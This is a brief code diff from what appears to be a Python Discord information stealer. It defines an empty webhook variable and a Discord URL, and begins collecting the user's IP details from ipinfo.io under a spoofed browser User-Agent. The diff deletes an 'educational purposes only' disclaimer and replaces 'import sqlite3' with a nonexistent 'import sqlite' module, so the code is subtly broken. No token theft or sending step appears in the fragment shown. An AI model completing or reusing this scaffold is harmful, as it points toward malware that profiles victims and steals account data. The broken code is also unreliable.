@@ -4,23 +4,12 @@ import json
 import requests
 from urllib.request import Request, urlopen
 # Sql
-import sqlite3
-
-
-
-# this is for educational purposes only
+import sqlite
 
 wh_url = "" # Too lazy
 ip_url = "https://ipinfo.io/json"
 base_url = "https://discord.com/channels/@me"
-
-
-
-
 def main():
-  
-
-
   # Call to the fuckin ip info url shit
   global ip_url
   req = Request(ip_url, headers={'User-Agent': 'Mozilla/5.0'})
